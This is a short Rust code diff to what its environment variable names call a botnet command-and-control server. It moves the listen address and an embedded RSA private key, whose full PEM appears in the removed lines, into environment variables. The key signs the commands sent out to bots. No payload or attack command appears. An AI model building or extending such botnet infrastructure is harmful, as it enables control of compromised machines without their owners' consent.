@@ -1,6 +1,7 @@
 use tokio::net::{TcpStream, TcpListener};
 use std::error::Error;
 use std::sync::{Arc, Mutex};
+use std::env;
 use tokio::io::{AsyncWriteExt, AsyncReadExt};
 use tokio::time::{sleep, Duration};
 use rsa::RsaPrivateKey;
@@ -12,43 +13,15 @@ use std::collections::HashSet;
 use std::net::SocketAddr;
 use rand;
 
-const CONTROL: &str = "0.0.0.0:8080";
-const PRIVATE_KEY_PEM: &str = "-----BEGIN RSA PRIVATE KEY-----
-MIIEowIBAAKCAQEA1KBXWBk/GxsfTWhKTSUp7SB/M+cE9vQHVYaeRgtzN4t430Jb
-mUbU3bMVusTc5FzE659d7JFpFmEV1jQuuscwarBtG4LTsgRzm/WntGlXLXqCLlr/
-lka01f5Lc+myAWj+fVGmFJArC20cdo2KEJXVnQnm9VYzUI0yz9Y0lyvBJYCoYqoX
-mX+ZJE6D/VrgZY5XSmeiDUeV5W8+wFUj7VE89B9agzKXjz3K1xUsrz7Q5Ri9XQ+F
-7ouLghP0P975jWSP2sHbRdtXSei7zb4baGOiOe/7mH1/xUSGmxyHuQlc0haOGUXC
-7jxT2jefOObS8Jry+lGlMMYpWSa5YazWBF+wnwIDAQABAoIBAHz0+j/hHnAcoWnJ
-d5kc1SXxajAjfYxwX3sI0S1S/1ROWCvFALX0pZbg701C8poWVvguQXGNB1hKmB25
-rxi/hRm+M3DukuDUsuieFv/0xHIKxETf38L+LLpyZv9pAN7JSH53pIYDL/jYF9ko
-V1Jl7BMNRbk6/o9BW/I+7ctFwI37mi4iXwgOtYbhqd97MiNMrw4RuvZskhnUhTnz
-5L6piNdPASxb2eJSb5DzmIG7xr8AwVoFB86ErPWyCsE4LT258fNQjU+RcCBeMQP+
-rxvnDBN3dcsYDWcNRBBjE+OyEgBnxZNuxHIPKVhiqfyqCti485a8gDMIF1JCTNEf
-VTL5Q7ECgYEA/ti4kRVmGzFXhDN0/KTwOItmF7XvlnyZRJ6kO4K8nZIVk65QP9aS
-KPdDjrX2KRoiCRAzz87O+8oIrbnjoIvPuUMc+oqy3RVQDDqNlypKNC8A8ID87j46
-FaO6RbccV1upKGsht7NqkIz+sQMtdF4E7hrSA9gxcdUk0j9xr+kfyDcCgYEA1Zaz
-mmZ4VKs0hD6OCr0wabdxhKaJTnhWr0Cw1IMhv/rO8WiHSzDqNKbys50Jxh3nwN01
-xrQ41SzT3yocWjkiQA+6TYf3aAchZohPjmbNlXRf2bWW/chY8FISP7qsQCuXzAhI
-KcXVFWYYMVcH5A+iA62/OGIrlt7/WZn2/ab31tkCgYEAmw287fj5EN5qgvLT4Mtx
-pNWbnh2B0iupDQkAn3yhybUSD7Jk/RJOB0K6BeBMDyHpR15mR69qW+PGd/y7s/ic
-v/lHbmBpBv5qn6YYc7q1Px7CEZJJUaLmsDfXo4cPZU9NklvsPdqZoa1HYOewBjcW
-BNCoqtIk8z9dkdYsE31hau0CgYAtcpCq5OzrzzYwgYMF4/W+OOttt2X2DYMcbV5z
-CagPypVoJr7LEBB1vaRc9ahTwJ9EmY1Mx6JkMdKvZK19wTR5fx88ShcpyoKf55dO
-DK/oAkg28f276HqMQFpjtxvZ16zIHGcGhHLvx7aUIRmrvGvT7o+GttThmHerICi/
-Fl0cGQKBgAfnceKHOuz/tQ8in1Wb17O0Mt+m0z9/lUc69JV4mSur/2MSjjKsB1Mu
-N+sXt8QolJCKjIn0/pKnDNcY1ZPwpfwFHQ77Mg6OlItW4i7CBpQoP5CVPOaObwlg
-hNRAhMwvEJWBcTVrjAhWACOT3KtCAZojlluwnaNSJqnfJBjn/4Zl
------END RSA PRIVATE KEY-----";
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
-    let listener = TcpListener::bind(CONTROL).await?;
+    let listener = TcpListener::bind(env::var("BOTNET_LISTENIP").expect("Env variable BOTNET_LISTENIP not set. This should be set with the listening port as well, ie 127.0.0.1:8000")).await?;
     let mut unique_connections: HashSet<SocketAddr> = HashSet::new();
 
     let args: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(std::env::args().collect()));
 
-    let private_key = RsaPrivateKey::from_pkcs1_pem(PRIVATE_KEY_PEM).expect("Could not get private key");
+    let private_key = RsaPrivateKey::from_pkcs1_pem(&env::var("BOTNET_PRIVATEPEM").expect("Env variable BOTNET_PRIVATEPEM not set. This should be set to the private key pem of your pkcs1 keypair.")).expect("Could not get private key");
     let signing_key: Arc<Mutex<SigningKey<Sha256>>> = Arc::new(Mutex::new(SigningKey::<Sha256>::new(private_key)));
 
     let mut conns = 0;
